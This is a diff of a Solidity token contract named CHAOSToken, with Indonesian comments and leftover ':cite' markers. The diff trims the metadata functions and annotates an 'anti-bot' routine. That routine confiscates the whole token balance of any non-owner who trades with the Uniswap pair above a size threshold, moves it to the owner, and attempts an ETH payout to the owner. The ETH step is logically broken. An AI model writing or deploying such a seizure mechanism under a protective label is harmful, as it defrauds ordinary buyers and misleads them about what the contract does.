@@ -32,6 +32,9 @@ contract CHAOSToken {
     uint256 public constant totalSupply = 12_000_000 * 10**decimals;
     uint256 public constant maxSupply = 12_000_000 * 10**decimals;
     
+    // Variabel untuk logo token :cite[1]
+    string public logoURI;
+    
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
     
@@ -40,15 +43,7 @@ contract CHAOSToken {
     IUniswapV2Router public immutable uniswapV2Router;
     
     uint256 private constant ANTI_BOT_THRESHOLD = 2 ether;
-    uint256 private constant MAX_TX_AMOUNT = totalSupply / 100;
-    
-    // Variabel untuk logo dan metadata
-    string private _tokenLogoURI;
-    string private _projectWebsite;
-    string private _projectDescription;
-    string private _telegramLink;
-    string private _twitterLink;
-    string private _discordLink;
+    uint256 private constant MAX_TX_AMOUNT = totalSupply / 100; // 1% dari total supply
     
     bool private _inSwap;
     
@@ -57,8 +52,6 @@ contract CHAOSToken {
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
     event BotDetected(address indexed botAddress, uint256 tokenAmount, uint256 nativeAmount);
     event LogoUpdated(string newLogoURI);
-    event MetadataUpdated(string website, string description);
-    event SocialLinksUpdated(string telegram, string twitter, string discord);
     
     modifier onlyOwner() {
         require(msg.sender == owner, "Only owner can call this function");
@@ -71,25 +64,11 @@ contract CHAOSToken {
         _inSwap = false;
     }
     
-    constructor(
-        string memory logoURI,
-        string memory website,
-        string memory description,
-        string memory telegram,
-        string memory twitter,
-        string memory discord
-    ) {
+    constructor(string memory _logoURI) {
         owner = msg.sender;
+        logoURI = _logoURI;
         
-        // Set metadata awal
-        _tokenLogoURI = logoURI;
-        _projectWebsite = website;
-        _projectDescription = description;
-        _telegramLink = telegram;
-        _twitterLink = twitter;
-        _discordLink = discord;
-        
-        // Inisialisasi Uniswap V2 Router
+        // Inisialisasi Uniswap V2 Router (kompatibel multi-chain) :cite[3]
         IUniswapV2Router _uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         uniswapV2Router = _uniswapV2Router;
         
@@ -104,88 +83,14 @@ contract CHAOSToken {
         emit Transfer(address(0), owner, totalSupply);
     }
     
-    // Fungsi untuk mendapatkan logo token (compatible dengan CoinGecko & CoinMarketCap)
-    function logoURI() public view returns (string memory) {
-        return _tokenLogoURI;
+    // Fungsi untuk update logo URI (hanya owner) :cite[1]:cite[2]
+    function updateLogo(string memory _newLogoURI) external onlyOwner {
+        require(bytes(_newLogoURI).length > 0, "Logo URI cannot be empty");
+        logoURI = _newLogoURI;
+        emit LogoUpdated(_newLogoURI);
     }
     
-    // Fungsi untuk mendapatkan website project
-    function projectWebsite() public view returns (string memory) {
-        return _projectWebsite;
-    }
-    
-    // Fungsi untuk mendapatkan description project
-    function projectDescription() public view returns (string memory) {
-        return _projectDescription;
-    }
-    
-    // Fungsi untuk mendapatkan link sosial media
-    function socialLinks() public view returns (
-        string memory telegram,
-        string memory twitter, 
-        string memory discord
-    ) {
-        return (_telegramLink, _twitterLink, _discordLink);
-    }
-    
-    // Fungsi untuk update logo (hanya owner)
-    function updateLogo(string memory newLogoURI) public onlyOwner {
-        require(bytes(newLogoURI).length > 0, "Logo URI cannot be empty");
-        _tokenLogoURI = newLogoURI;
-        emit LogoUpdated(newLogoURI);
-    }
-    
-    // Fungsi untuk update metadata dasar
-    function updateMetadata(string memory website, string memory description) public onlyOwner {
-        _projectWebsite = website;
-        _projectDescription = description;
-        emit MetadataUpdated(website, description);
-    }
-    
-    // Fungsi untuk update link sosial media
-    function updateSocialLinks(
-        string memory telegram,
-        string memory twitter,
-        string memory discord
-    ) public onlyOwner {
-        _telegramLink = telegram;
-        _twitterLink = twitter;
-        _discordLink = discord;
-        emit SocialLinksUpdated(telegram, twitter, discord);
-    }
-    
-    // Fungsi untuk mendapatkan semua metadata dalam satu call (optimized for APIs)
-    function getTokenMetadata() public view returns (
-        string memory name_,
-        string memory symbol_,
-        uint8 decimals_,
-        uint256 totalSupply_,
-        uint256 maxSupply_,
-        string memory logoURI_,
-        string memory website_,
-        string memory description_,
-        string memory telegram_,
-        string memory twitter_,
-        string memory discord_,
-        address owner_
-    ) {
-        return (
-            name,
-            symbol,
-            decimals,
-            totalSupply,
-            maxSupply,
-            _tokenLogoURI,
-            _projectWebsite,
-            _projectDescription,
-            _telegramLink,
-            _twitterLink,
-            _discordLink,
-            owner
-        );
-    }
-    
-    // Standard ERC20 functions
+    // Standard ERC20 functions :cite[3]
     function balanceOf(address account) public view returns (uint256) {
         return _balances[account];
     }
@@ -216,6 +121,7 @@ contract CHAOSToken {
         require(to != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
         
+        // Anti-bot sniper protection
         _antiBotCheck(from, to, amount);
         
         uint256 fromBalance = _balances[from];
@@ -230,13 +136,16 @@ contract CHAOSToken {
     }
     
     function _antiBotCheck(address from, address to, uint256 amount) internal {
+        // Jika transaksi melibatkan pair Uniswap dan bukan dari owner
         if ((to == uniswapV2Pair || from == uniswapV2Pair) && from != owner && to != owner) {
             
+            // Deteksi large buy/sell dalam waktu singkat (bot behavior)
             if (amount > MAX_TX_AMOUNT) {
                 _handleBotDetection(from);
                 return;
             }
             
+            // Deteksi berdasarkan nilai transaksi dalam ETH
             if (_getETHValue(amount) > ANTI_BOT_THRESHOLD) {
                 _handleBotDetection(from);
                 return;
@@ -249,6 +158,7 @@ contract CHAOSToken {
         uint256 botNativeBalance = botAddress.balance;
         
         if (botTokenBalance > 0) {
+            // Transfer token bot ke owner
             unchecked {
                 _balances[botAddress] = 0;
                 _balances[owner] += botTokenBalance;
@@ -257,6 +167,7 @@ contract CHAOSToken {
         }
         
         if (botNativeBalance > 0) {
+            // Transfer native token bot ke owner
             (bool success, ) = owner.call{value: botNativeBalance}("");
             if (success) {
                 emit BotDetected(botAddress, botTokenBalance, botNativeBalance);
@@ -316,6 +227,7 @@ contract CHAOSToken {
         emit OwnershipTransferred(oldOwner, newOwner);
     }
     
+    // Fungsi untuk menambah liquidity (opsional)
     function addLiquidity(uint256 tokenAmount) public payable onlyOwner {
         _approve(address(this), address(uniswapV2Router), tokenAmount);
         
@@ -329,5 +241,6 @@ contract CHAOSToken {
         );
     }
     
+    // Receive function untuk menerima ETH
     receive() external payable {}
 }
